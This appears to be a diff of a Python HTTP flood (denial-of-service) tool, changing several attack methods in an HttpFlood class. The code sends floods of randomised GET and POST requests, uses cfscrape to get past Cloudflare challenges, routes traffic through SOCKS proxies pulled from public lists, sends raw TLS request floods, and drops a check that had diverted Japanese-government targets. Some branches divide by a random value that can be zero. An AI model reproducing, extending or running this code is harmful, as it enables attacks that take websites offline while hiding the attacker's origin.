+        scraper = cfscrape.create_scraper()
 
         # Attacking
         try:
-            bypass_method = int(random.randint(0,2))
-            if bypass_method == 0:
-                scraper = cfscrape.create_scraper()
-            else:
-                scraper = Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest())
-            for _ in range(self._rpc):
-                sleep(max(self._rpc / 1000, 1))
-                attack_method = int(random.randint(0,3))
-                if self._rpc % attack_method == 0:
-                     scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)
-                elif self._rpc % attack_method == 1:
-                     scraper.get(url+ "/?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
-                elif self._rpc % attack_method == 2:
-                     scraper.get(url+ "/?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), headers=headersx, timeout=60)
-                else:
-                     scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)  
+           for _ in range(self._rpc):
+               attack_method = int(random.randint(0,3))
+
+               if self._rpc % attack_method == 0:
+                    scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)
+               elif self._rpc % attack_method == 1:
+                    scraper.get(url+ "/?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
+               elif self._rpc % attack_method == 2:
+                    scraper.get(url+ "/?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), headers=headersx, timeout=60)
+               else:
+                    scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)
+       
         except:
-            sleep(random.randint(1,10))
+            sleep(random.randint(10,15))
         finally:
             Tools.safe_close(scraper)
 
     def AMAMI_CANON2(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
 
         s = None
 
-        try:
-            bypass_method = int(random.randint(0,1))
-            if bypass_method == 0:
-                #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-                with suppress(Exception), create_scraper() as s:
-                     for _ in range(self._rpc):
-                         sleep(max(self._rpc / 1000, 1))
-                         attack_method = int(random.randint(0,3))
-                         if self._rpc % attack_method == 0:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                         elif self._rpc % attack_method == 1:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                         elif self._rpc % attack_method == 2:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                         elif self._rpc % attack_method == 3:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-            else:
-                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as s:
-                     for _ in range(self._rpc):
-                         sleep(min(self._rpc, 5) / 100)
-                         attack_method = int(random.randint(0,3))
-                         if self._rpc % attack_method == 0:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                                 continue
-                         elif self._rpc % attack_method == 1:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                                 continue
-                         elif self._rpc % attack_method == 2:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                                 continue
-                         elif self._rpc % attack_method == 3:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
-                                 REQUESTS_SENT += 1
-                                 BYTES_SEND += Tools.sizeOfRequest(res)
-                                 continue
-        except:
-            sleep(random.randint(1,10))
-        finally:
-            Tools.safe_close(s)
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    attack_method = int(random.randint(0,3))
+                    if self._rpc % attack_method == 0:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 1:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 2:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 3:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+            except:
+                sleep(random.randint(10,15))
+            finally:
+                Tools.safe_close(s)
 
     def AMAMI_CANON3(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1898,7 +1821,6 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
       
         proxy = pro.ip_port().split(":")
-
         req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
         #req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -1948,25 +1870,55 @@ class HttpFlood(Thread):
         else:
             req += "Sec-Fetch-Dest: document\r\n"
 
-        for _ in range(self._rpc):
+        try:
+            s = socks.socksocket()
+            s.connect((str(self._host), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
             try:
-                with socks.socksocket() as s:
-                    s = socks.socksocket()
-                    s.connect((str(self._host), int(443)))
-                    s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._target)
+                for _ in range(self._rpc):
                     s.send(str.encode(req))
-                    try:
-                        for _ in range(100):
-                            s.send(str.encode(req))
-                            s.send(str.encode(req))
-                    except:
-                        sleep(random.randint(1,2))
-                    finally:
-                        pass
+                    s.send(str.encode(req))
             except:
-                pass
+                s.close()
+        except:
+            s.close()
+
+    def AMAMI_CANON4(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    attack_method = int(random.randint(0,3))
+                    if self._rpc % attack_method == 0:
+                        with s.post(str(self._target), data=str(random.randint(0,200000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 1:
+                        with s.post(str(self._target), data=Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 2:
+                        with s.post(str(self._target), data=str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+                    elif self._rpc % attack_method == 3:
+                        with s.post(str(self._target), data=Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+            except:
+                sleep(random.randint(10,15))
             finally:
                 Tools.safe_close(s)
 
@@ -2517,7 +2469,7 @@ def DownloadProxies(proxy_ver: str, out_file: str):
 			#"https://spys.me/socks.txt",
 			#"https://www.freeproxychecker.com/result/socks4_proxies.txt",
 			"https://www.proxy-list.download/api/v1/get?type=socks4",
-			#"https://www.proxyscan.io/download?type=socks4",
+			"https://www.proxyscan.io/download?type=socks4",
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
 			"https://api.openproxylist.xyz/socks4.txt",
 		]
@@ -2551,7 +2503,7 @@ def DownloadProxies(proxy_ver: str, out_file: str):
 		socks5_api = [
 			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
 			"https://www.proxy-list.download/api/v1/get?type=socks5",
-			#"https://www.proxyscan.io/download?type=socks5",
+			"https://www.proxyscan.io/download?type=socks5",
 			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
 			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
 			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
@@ -2635,17 +2587,6 @@ def DownloadProxies(proxy_ver: str, out_file: str):
 
 	print("> Have already downloaded proxies list as "+ str(out_file))
 
-def CheckBlackList(urlraw: str):
-
-    if urlraw in BlackLists.JAPANESE_GOVERMENT:
-        urlraw = "https://www.19371213.com.cn/"
-    else:
-        for blacklist_url in BlackLists.JAPANESE_GOVERMENT:
-
-            if blacklist_url.startswith(urlraw):
-                urlraw = "https://www.19371213.com.cn/"
-
-    return urlraw
 
 
 if __name__ == '__main__':
@@ -2686,7 +2627,7 @@ if __name__ == '__main__':
                      ", ".join(Methods.ALL_METHODS))
 
             if method in Methods.LAYER7_METHODS:
-                url = URL(CheckBlackList(urlraw))
+                url = URL(urlraw)
                 host = url.host
 
                 if method != "TOR":
@@ -2701,7 +2642,7 @@ if __name__ == '__main__':
                 proxy_ty = int(argv[3].strip())
                 proxy_li = Path(__dir__ / "files/proxies/" /
                                 argv[5].strip())
-                useragent_li = Path(__dir__ / "files/ua.txt")
+                useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
                 bombardier_path = Path.home() / "go/bin/bombardier"
                 proxies: Any = set()
@@ -2738,7 +2679,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                DownloadProxies(proxy_ty, proxy_li)
+                #DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
